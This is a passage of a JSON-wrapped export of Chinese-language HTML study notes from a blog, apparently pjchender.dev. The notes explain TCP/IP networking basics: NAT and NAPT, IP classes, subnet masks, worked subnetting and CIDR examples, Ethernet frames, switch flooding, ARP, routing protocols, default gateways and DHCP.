aria-label=\"NAT（Network Address Translation，網路位址轉譯）：一對一轉換的直接連結\" title=\"NAT（Network Address Translation，網路位址轉譯）：一對一轉換的直接連結\">​</a></h4><p>功能：<strong>將內網的 IP 對應到外網的 IP</strong></p><p>這種方式<strong>路由器會先被指派好幾個不同的公用 IP 位址</strong>，當區域網路內的電腦要連上網際網路時，會從中選擇一個來用，電腦在區域網路中將 IP 封包轉送到網際網路時，私有 IP 位址會被轉換為公有 IP 位址。透過此種方式<strong>可同時連上網際網路的的電腦台數取決於路由器所掌管的公有 IP 位址數量</strong>。</p><blockquote><p>NAT 的說明可參考 <a href=\"https://ithelp.ithome.com.tw/articles/10209590\" target=\"_blank\" rel=\"noopener noreferrer\">30-28 之 WebRTC 連線前傳 - 為什麼 P2P 連線很麻煩 ? ( NAT )</a> @ iThome</p></blockquote><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"naptnetwork-address-port-translation多對一轉換\">NAPT（Network Address Port Translation）：多對一轉換<a href=\"#naptnetwork-address-port-translation多對一轉換\" class=\"hash-link\" aria-label=\"NAPT（Network Address Port Translation）：多對一轉換的直接連結\" title=\"NAPT（Network Address Port Translation）：多對一轉換的直接連結\">​</a></h4><p>透過轉換 IP 位址時同時轉換連接埠號的方式，<strong>讓多台電腦可以共用同一個公用 IP 位址</strong>。這種方式在執行 TCP/IP 通訊時，除了目的端 IP 位址和連接埠號會被寫入封包外，發送端的 IP 位址和連接埠號也會寫入封包中；在封包被傳送到網際網路時，<strong>發送端 IP 位址和連接埠號的組合會被轉換成路由器公用 IP 位址和路由器所管理的連接埠號組合</strong>。如此<strong>，即使路由器只有一個公用 IP 位址，區域網路內的多台電腦也能和網際網路上的電腦相互連線與通訊</strong>。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"ip-位址分級\">IP 位址分級<a href=\"#ip-位址分級\" class=\"hash-link\" aria-label=\"IP 位址分級的直接連結\" title=\"IP 位址分級的直接連結\">​</a></h3><p>IP 位址採用分級的概念，可以分成 A ~ E 五種等級，其中 D 和 E 為特殊用途，A ~ C 則為一般的位址。<strong>A ~ C 級的差異在於每個網路位址可支援的主機數量不同</strong>：</p><table><thead><tr><th>級別</th><th>第一個位元組</th><th>起始位址</th><th>結束位址</th><th>子網路預設遮罩</th></tr></thead><tbody><tr><td>A 級（Class A）</td><td>0 - 127</td><td>10.0.0.0</td><td>10.255.255.255</td><td>255.0.0.0</td></tr><tr><td>B 級（Class B）</td><td>128 - 191</td><td>172.16.0.0</td><td>172.31.255.255</td><td>255.255.0.0</td></tr><tr><td>C 級（Class C）</td><td>192 - 223</td><td>192.168.0.0</td><td>192.168.255.255</td><td>255.255.255.0</td></tr></tbody></table><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"子網路遮罩subnet-mask網路切割\">子網路遮罩（subnet mask）：網路切割<a href=\"#子網路遮罩subnet-mask網路切割\" class=\"hash-link\" aria-label=\"子網路遮罩（subnet mask）：網路切割的直接連結\" title=\"子網路遮罩（subnet mask）：網路切割的直接連結\">​</a></h2><p>IP 位址除了使用半形句點來分隔 4 個十進位小數點格式的數字來表示（例如 <code>192.168.123.132</code> ）外，也可以使用 <strong>32 位元的二進制數</strong>來表示，該位址會獨一無二地識別 TCP/IP 網路上的主機 (電腦或其他裝置，例如印表機或路由器)。</p><p>若想要了解如何使用子網路遮罩區分主機、網路及子網路，需以二進位表示法來查看 IP 位址。</p><p>例如，<code>192.168.123.132</code> 可以轉換成 <code>11000000.10101000.01111011.10000100</code>。</p><p>為了使 TCP/IP 廣域網路（WAN）能有效做為網路集合，<strong>在網路之間傳送資料封包的路由器，並不知道資訊封包目的地之主機的確切位置。路由器只會知道主機所屬的網路，並且會利用儲存在其路由表中的資訊，來決定如何將封包傳送到目的地主機的網路。當封包傳送到目的地網路之後，該封包就會傳送到適當的主機</strong>。</p><p>為了讓封包能順利傳送到目的地所屬的網路及該主機位置，IP 位址包含有兩個部分，<strong>IP 位址的第一部分是做為「網路位址（Network Address）」，第二個部分是做為主機位址。</strong>但由於在 TCP/IP 來說，IP 位址中做為網路及主機位址的部分並非固定的，<strong>因此 TCP/IP 通訊協定會使用子網路遮罩（subnet mask），來得知網路位址和主機位址（決定主機是位於本機子網路上或在遠端網路上）</strong>。</p><blockquote><ul><li><strong>主機（host）</strong>：TCP/IP 網路上的電腦或其他裝置。</li><li><strong>網路位址（Network Address）</strong>：主機部分全部為 0 的 IP 位址。</li></ul></blockquote><p>子網路遮罩就是 32 位元的二進位數字，舉例來說，子網路遮罩為：<code>11111111.11111111.11111111.0000000</code>，當我們<strong>將 IP 位址和子網路遮罩排在一起，就能分隔位址的網路部分與主機部分</strong>：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">11000000.10101000.01111011.10000100 -- IP 位址 (192.168.123.132)</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">11111111.11111111.11111111.00000000 -- 子網路遮罩 (255.255.255.0)</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>前 24 個位元（子網路遮罩當中的 24 個數字 1）識別為網路位址，最後 8 個位元（子網路遮罩中剩餘的 8 個數字 0）識別為主機位址。這樣可得到下列結果：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">11000000.10101000.01111011.00000000 -- 網路位址 (192.168.123.0)</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">00000000.00000000.00000000.10000100 -- 主機位址 (000.000.000.132)</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>因此可以得到：</p><div class=\"codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-text codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">192.168.123.0   - 網路位址。</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">0.0.0.132       - 主機位址。</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>以 TCP/IP 來說，IP 位址中做為網路及主機位址的部分並非固定的，因此除非您擁有更多資訊，否則無法決定上述網路及主機位址。此資訊是由另一個稱為子網路遮罩的 32 位元數字所提供。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"子網路subnet與廣播位址broadcast-address\">子網路（subnet）與廣播位址（Broadcast Address）<a href=\"#子網路subnet與廣播位址broadcast-address\" class=\"hash-link\" aria-label=\"子網路（subnet）與廣播位址（Broadcast Address）的直接連結\" title=\"子網路（subnet）與廣播位址（Broadcast Address）的直接連結\">​</a></h3><p>將網路切割為規模較小網段的連線架構就稱為<strong>子網路（subnet）</strong>。分割子網路可以讓網路位址部分增加，但主機位址相對減少。例如，借用 2 個位元的主機位址給網路位址時，就可以多畫出 4 個子網路，見下面的實例。</p><p>在子網路中，IP 最後一個位元組的第一個數值（例如，<code>192.168.1.0</code>）和最後一個數值（例如，<code>192.168.1.255</code>）是無法使用的位址，因為「主機部分」全部是 1 及全部是 0 的二進位位址（即，255 和 0）是無效的。</p><ul><li><strong>0 位址無效，因為該位址是用來指定未指定主機的網路</strong>。</li><li><strong>255 位址無效，因為它是用來對網路上的所有主機廣播訊息</strong>。</li></ul><blockquote><p>請牢記，任何網路或子網路中的第一個位址及最後一個位址，都不能指派給任何個別主機。</p></blockquote><p>所謂廣播（broadcast）就是同時對某個網域裡的所有電腦傳送資料。</p><blockquote><p><strong>廣播位址 (Broadcast Address)</strong>：主機位址部分全部為 1 的 IP 位址。</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"實例example\">實例（example）<a href=\"#實例example\" class=\"hash-link\" aria-label=\"實例（example）的直接連結\" title=\"實例（example）的直接連結\">​</a></h3><p>假設被分派到的網路是 <code>類別 C 網路 192.168.123.0</code>，表示將有 <code>192.168.123.1 ~ 192.168.123.254</code> 可以使用，若我們想要將它分成 4 個子網路，即可以使用子網路遮罩 <code>255.255.255.192</code>：</p><div class=\"language-ruby codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-ruby codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 網路遮罩 255.255.255.192</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">11111111.11111111.11111111.11 000000</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">|------     網路位址    ------|-主機位址-|</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>因為最後一個位元組的前 2 個位數變成網路位置，所以有 <code>00 000000(0)</code>, <code>01 000000(64)</code>, <code>10 000000(128)</code>, <code>11 000000(192)</code> 這四種網路位址可以使用；而其他的 6 個位數則可用於分配主機位址。</p><p>總結來說使用子網路遮罩 <code>255.255.255.192</code> 時，<code>192.168.123.0</code> 的網路就會變成 <code>192.168.123.0</code>、<code>192.168.123.64</code>、<code>192.168.123.128</code> 及 <code>192.168.123.192</code> 這四個網路。</p><p>這四個網路會有下列有效的主機位址：</p><div class=\"language-ruby codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-ruby codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">192.168.123.1-62</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">192.168.123.65-126</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">192.168.123.129-190</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">192.168.123.193-254</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><blockquote><p>同樣地，切記全部是 1 或全部是 0 的二進位主機位址為無效位址，所以不能使用最後一個八位元資料組為 0、63、64、127、128、191、192 或 255 的位址。</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"可變長度子網路遮罩vlsm\">可變長度子網路遮罩（VLSM）<a href=\"#可變長度子網路遮罩vlsm\" class=\"hash-link\" aria-label=\"可變長度子網路遮罩（VLSM）的直接連結\" title=\"可變長度子網路遮罩（VLSM）的直接連結\">​</a></h3><p>傳統上的子網路遮罩屬於固定長度的子網路遮罩，每個子網路所容納的電腦台數必須相同；然而，透過<strong>可變長度子網路遮罩（VLSM, Variable Length Subnet Masking）</strong>的技術，可以讓子網路遮罩的長度隨著子網路而改變，<strong>決定每個子網路的電腦連線數量時會更有彈性</strong>。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"無類別域際選路cidr-classless-inter-domain-routing\">無類別域際選路（CIDR, classless inter-domain routing）<a href=\"#無類別域際選路cidr-classless-inter-domain-routing\" class=\"hash-link\" aria-label=\"無類別域際選路（CIDR, classless inter-domain routing）的直接連結\" title=\"無類別域際選路（CIDR, classless inter-domain routing）的直接連結\">​</a></h4><p>CIDR 是以 VLSM 為基礎的技術，它可以、透過將網路部分的位址縮短，即可透過相同的轉送規則，將資料轉送到多個網路。</p><blockquote><p>廣義上來說，能夠任意設定網路部分的位址長度即可稱為 CIDR。</p></blockquote><p><strong>CIDR 標記法</strong>：<code>IP / &lt;網路位址部分位元數&gt;</code></p><table><thead><tr><th>子網路區段</th><th>CIDR</th><th>範圍</th><th>可連線數</th></tr></thead><tbody><tr><td>子網路 1</td><td>192.168.1.0 /25</td><td>192.168.1.0 ~ 192.168.1.127</td><td>126 台</td></tr><tr><td>子網路 2</td><td>192.168.1.128 /26</td><td>192.168.1.128 ~ 192.168.1.191</td><td>62 台</td></tr><tr><td>子網路 3</td><td>192.168.1.192 /26</td><td>192.168.1.192 ~ 192.168.1.255</td><td>62 台</td></tr></tbody></table><blockquote><p>IP 總共為 32 的位元數，<code>\\25</code> 表示使用的網路位址部分佔了 25 的位元數，因此可用的位元數為 7 個，共可提供 <code>2 ^ 7 - 2 = 126</code> 台連線數。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"延伸閱讀\">延伸閱讀<a href=\"#延伸閱讀\" class=\"hash-link\" aria-label=\"延伸閱讀的直接連結\" title=\"延伸閱讀的直接連結\">​</a></h2><ul><li><a href=\"http://www.pcnet.idv.tw/pcnet/network/network.htm\" target=\"_blank\" rel=\"noopener noreferrer\">網路教學：網路概論、TCP/IP 基礎、網路安全基礎</a> @ PCNet</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"資料來源\">資料來源<a href=\"#資料來源\" class=\"hash-link\" aria-label=\"資料來源的直接連結\" title=\"資料來源的直接連結\">​</a></h2><ul><li><a href=\"http://www.flag.com.tw/book/5105.asp?bokno=FT176\" target=\"_blank\" rel=\"noopener noreferrer\">MIS 一定要懂的 82 個網路技術知識</a> @ 旗標出版</li></ul><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"tcpip-模型\">TCP/IP 模型<a href=\"#tcpip-模型\" class=\"hash-link\" aria-label=\"TCP/IP 模型的直接連結\" title=\"TCP/IP 模型的直接連結\">​</a></h4><ul><li><a href=\"https://ithelp.ithome.com.tw/articles/10205102\" target=\"_blank\" rel=\"noopener noreferrer\">30-10 之通訊協議的基本常識</a> - 30 天之即時網路影音開發攻略(小白本) @ iThome</li><li><a href=\"https://support.microsoft.com/zh-tw/help/164015/understanding-tcp-ip-addressing-and-subnetting-basics\" target=\"_blank\" rel=\"noopener noreferrer\">了解 TCP/IP 定址及子網路基本概念</a> @ Microsoft Support</li><li><a href=\"https://zh.wikipedia.org/wiki/TCP/IP协议族\" target=\"_blank\" rel=\"noopener noreferrer\">TCP/IP 協定套組</a> @ Wiki</li></ul><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"其他\">其他<a href=\"#其他\" class=\"hash-link\" aria-label=\"其他的直接連結\" title=\"其他的直接連結\">​</a></h4><ul><li><a href=\"https://fossbytes.com/difference-lan-wan-man-can-vpn-ban-nan-san/\" target=\"_blank\" rel=\"noopener noreferrer\">What Is The Difference Between LAN, WAN, MAN, CAN, VPN, BAN, NAN, SAN?</a> @ Fossbytes</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [網際網路] TCP_IP 階層模型-基礎 part 2 pjchender.dev": {
    "prefix": "hinternet [網際網路] TCP_IP 階層模型-基礎 part 2 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[網際網路] TCP_IP 階層模型-基礎 part 2</h1></header><blockquote><p>此文章為各筆記之整理，非原創，擷取來源可見下方資料來源。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"資料傳送\">資料傳送<a href=\"#資料傳送\" class=\"hash-link\" aria-label=\"資料傳送的直接連結\" title=\"資料傳送的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"乙太網路的傳輸機制訊框frame\">乙太網路的傳輸機制：訊框（frame）<a href=\"#乙太網路的傳輸機制訊框frame\" class=\"hash-link\" aria-label=\"乙太網路的傳輸機制：訊框（frame）的直接連結\" title=\"乙太網路的傳輸機制：訊框（frame）的直接連結\">​</a></h3><p>乙太網路會先將資料切割為較小單位，稱為<strong>訊框（frame）</strong>，接著轉換為電子訊號或光訊號後，再傳送給通訊媒體。以 TCP/IP 協定來說，訊框最多可以包含 1,500 bytes，一旦資料超過這個大小，就必須要分成多次反覆傳送。</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/IUFOcoy.jpg\" class=\"img_ev3q\"></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"廣播單播與群播\">廣播、單播與群播<a href=\"#廣播單播與群播\" class=\"hash-link\" aria-label=\"廣播、單播與群播的直接連結\" title=\"廣播、單播與群播的直接連結\">​</a></h3><p>封包的傳送可以分為：</p><ul><li><strong>單播（Unicast）</strong>：僅將資料傳送給一台電腦，也就是一對一的傳輸方式。</li><li><strong>群播（Multicast）</strong>：將資料傳送到<strong>同一群組</strong>中的特定電腦。</li><li><strong>廣播（Broadcast）</strong>：將資料傳送到<strong>所有</strong>在同一個乙太網路上的所有電腦。</li></ul><p>其中廣播和群播這兩種通訊方式都可以用來和多台目的端電腦互相通訊，但兩者的傳送範圍不同。</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"有線廣播位址和直接廣播位址\">有線廣播位址和直接廣播位址<a href=\"#有線廣播位址和直接廣播位址\" class=\"hash-link\" aria-label=\"有線廣播位址和直接廣播位址的直接連結\" title=\"有線廣播位址和直接廣播位址的直接連結\">​</a></h4><p>要進行廣播時，可以將封包傳送到<strong>有限廣播位址<code>（255.255.255.255）</code></strong> 或<strong>直接廣播位址（IP 位址中，主機位址全為 1 的位址）</strong>。以有限廣播位址為目的端的資料會被傳送到同一個網路中的所有電腦，但不會超出路由器涵蓋範圍以外的網路。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"利用-mac-位址傳送資料\">利用 MAC 位址傳送資料<a href=\"#利用-mac-位址傳送資料\" class=\"hash-link\" aria-label=\"利用 MAC 位址傳送資料的直接連結\" title=\"利用 MAC 位址傳送資料的直接連結\">​</a></h3><p>乙太網路等網路硬體裝置會利用 MAC 位址來指定專屬的通訊對象。</p><p>傳統上，會透過 <strong>匯流排拓撲(Bus Topology)</strong> 的概念，利用 <strong>集線器 (Hub)</strong>：不同電腦間的封包傳遞，將多台電腦連接到同一條同軸纜線，將接收端的 MAC 位址附加在乙太網路訊框（frame）上。接著將資料傳送給所有的設備，電腦接收到訊框後根據 MAC 位址確認是自己的接收端才能接受資料，否則將利用 <strong>cut-through（直通轉發）</strong>的機制將資料傳送出去。</p><p>現有的乙太網路設備會於<strong>交換器</strong>上紀錄每個連線設備的 MAC Address 以及所對應的連接埠，因此當資料傳送到交換器時，會先根據所儲存的 MAC Address Table 指定該裝置是對應到哪個連接埠上，最後再將乙太網路訊框傳送到該連接埠上，因此<strong>資料只會被傳送到正確的裝置上</strong>。</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/GS1WATn.jpg\" class=\"img_ev3q\"></p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"洪泛flooding\">洪泛（flooding）<a href=\"#洪泛flooding\" class=\"hash-link\" aria-label=\"洪泛（flooding）的直接連結\" title=\"洪泛（flooding）的直接連結\">​</a></h4><blockquote><ul><li>在資料接收端的 MAC 位址尚未註冊到 MAC Address Table 上時，會先將資料傳送到「除了來源埠」之外的「所有連接埠」，這種情況稱作「<strong>洪泛（flooding）</strong>」。</li><li>除了上述情況會發生洪泛外，當交換器在廣播或群播時也會執行洪泛的動作。</li></ul></blockquote><p><img loading=\"lazy\" src=\"../../../i.imgur.com/a50lTO3.jpg\" class=\"img_ev3q\"></p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"arp根據-ip-位址查詢-mac-位址\">ARP：根據 IP 位址查詢 MAC 位址<a href=\"#arp根據-ip-位址查詢-mac-位址\" class=\"hash-link\" aria-label=\"ARP：根據 IP 位址查詢 MAC 位址的直接連結\" title=\"ARP：根據 IP 位址查詢 MAC 位址的直接連結\">​</a></h3><p>連接到乙太網路的硬體設備需要透過 MAC 位址來指定通訊目的端，但在 TCP/IP 協定中則需透過 IP 位址來指定目的端。此時需要先</p><ol><li><strong>判斷發送端和接收端的電腦是否處於相同的區域網路內</strong>：利用網路遮罩可以算出發送端和接收端的網路位址，當兩者的網路位址相同時，表示兩台電腦是連接到同一個實體網路。</li><li>將 IP 位址轉換成 MAC 位址：接著利用<strong>位址解析通訊協定（ARP，Address Resolution Protocol）</strong>可查詢目的端電腦的 MAC 位址，查詢到目的端電腦的 MAC 位址後，即可將乙太網路訊框傳送到目的端。</li></ol><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"arp-動作概述\">ARP 動作概述<a href=\"#arp-動作概述\" class=\"hash-link\" aria-label=\"ARP 動作概述的直接連結\" title=\"ARP 動作概述的直接連結\">​</a></h4><p><img loading=\"lazy\" src=\"../../../i.imgur.com/psNoJS4.jpg\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"路由routing預設閘道default-gateway\">路由（Routing）預設閘道（Default Gateway）<a href=\"#路由routing預設閘道default-gateway\" class=\"hash-link\" aria-label=\"路由（Routing）預設閘道（Default Gateway）的直接連結\" title=\"路由（Routing）預設閘道（Default Gateway）的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"路由routing處理封包的轉送\">路由（Routing）：處理封包的轉送<a href=\"#路由routing處理封包的轉送\" class=\"hash-link\" aria-label=\"路由（Routing）：處理封包的轉送的直接連結\" title=\"路由（Routing）：處理封包的轉送的直接連結\">​</a></h3><p>IP 封包必須透過 <strong>路由器</strong>（Router）：將一個 IP 分享給多個電腦，決定資料傳遞路徑)轉送才能與另一個網路上的主機通訊，而轉送封包的過程就稱為<strong>路由（routing）</strong>，而決定轉送規則最重要的因素就是路由表（routing table）。</p><p>當某部主機使用 TCP/IP 嘗試與另一個裝置通訊時，該主機會使用接收端和發送端的子網路遮罩和 IP 位址來取得網路位址（Network Address），以此判斷目的地是同一網路內的電腦或遠端的電腦。</p><p>若這項程序的結果判斷目的地是同一網路內的電腦，則電腦只會在本機子網路上傳送封包。若比較的結果判斷目的是遠端主機，電腦會將封包轉送到 TCP/IP 內容中所定義的預設閘道（Default Gateway），再從路由表中找出和該網路位址相關的轉送規則，找到規則後，然後再由路由器負責將封包轉送到正確的子網路。</p><blockquote><p>通常需要由好幾台路由反覆的進行這項轉送處理作業，才能將封包順利送到目的端電腦。</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"路由表的更新與路由協定\">路由表的更新與路由協定<a href=\"#路由表的更新與路由協定\" class=\"hash-link\" aria-label=\"路由表的更新與路由協定的直接連結\" title=\"路由表的更新與路由協定的直接連結\">​</a></h3><p>路由表並不是註冊一次就一勞永逸，當有新增網路或電腦時，都需要修正路由表。修正的方式主要有兩種：</p><ul><li><strong>靜態路由</strong>：採用固定的路由表，一旦網路架構改變，就必須手動方式來變更路由表，只適合小型網路。</li><li><strong>動態路由</strong>：路由表採動態更新的方式，一旦網路架構改變，會自動反映在路由表中，而適用於動態路由的協定就稱為「<strong>路由協定</strong>」。</li></ul><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"路由協定\">路由協定<a href=\"#路由協定\" class=\"hash-link\" aria-label=\"路由協定的直接連結\" title=\"路由協定的直接連結\">​</a></h4><p>路由協定最重要的是：</p><ol><li>讓路由器彼此交換路徑資料</li><li>根據收集到的路徑資料，找出最佳路徑</li></ol><p>路由協定大致包含兩種類型，一種是 <strong>IGP（Interior Gateway Protocol，內部閘道協定）</strong>，一種是 <strong>EGP（Exterior Gateway Protocol，外部閘道協定）</strong>。</p><ul><li><strong>IGP（Interior Gateway Protocol，內部閘道協定）</strong>：適用於自治系統內的路由，處理路徑資料，主要包含了 <strong>RIP/RIP2（Routing Information Protocol，路由信息協定）</strong>和 <strong>OSPF（Open Shortest Path First，最短路徑優先）</strong>。前者只會考量路徑上路由器數量最少的一條，後者可以考量網路速度等其他因素。</li><li><strong>EGP（Exterior Gateway Protocol，外部閘道協定）</strong>：適用於自治系統間的路由，最具代表性的是 <strong>BGP（border gateway protocol，邊界閘道協定）</strong>，它會根據資料選擇到達某個網路的最佳途徑。</li></ul><blockquote><p><strong>自治系統（AS，Autonomous System）</strong>指的是規模相當於一個 ISP 或大企業內的大規模網路。</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"預設閘道default-gateway當封包的發送端和目的端不在同一網域內\">預設閘道（Default Gateway）：當封包的發送端和目的端不在同一網域內<a href=\"#預設閘道default-gateway當封包的發送端和目的端不在同一網域內\" class=\"hash-link\" aria-label=\"預設閘道（Default Gateway）：當封包的發送端和目的端不在同一網域內的直接連結\" title=\"預設閘道（Default Gateway）：當封包的發送端和目的端不在同一網域內的直接連結\">​</a></h3><p>當封包傳送的發送端和目的端並不在同一個網域，此時無法掌握目的端的確切資訊，這時後需要將封包轉送到預設閘道。<strong>電腦通常會指定網路出入口的路由器作為預設閘道</strong>，設定預設閘道的方式可以手動設定或透過 DHCP 自動設定。</p><blockquote><p>預設閘道就是當目的端未知時所預設的傳送對象。</p></blockquote><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"dhcp-伺服器將-ip-位址指派給每一台電腦\">DHCP 伺服器：將 IP 位址指派給每一台電腦<a href=\"#dhcp-伺服器將-ip-位址指派給每一台電腦\" class=\"hash-link\" aria-label=\"DHCP 伺服器：將 IP 位址指派給每一台電腦的直接連結\" title=\"DHCP 伺服器：將 IP 位址指派給每一台電腦的直接連結\">​</a></h3><p><strong>DHCP（dynamic host configuration protocol，動態主機組態協定）</strong>這項機制可針對連線到網路的電腦，自動指派重要的網路設定資料，其中像是電腦的 IP 位址﹑子網路遮罩、預設閘道、DNS 伺服器的 IP 位址等等。要使用 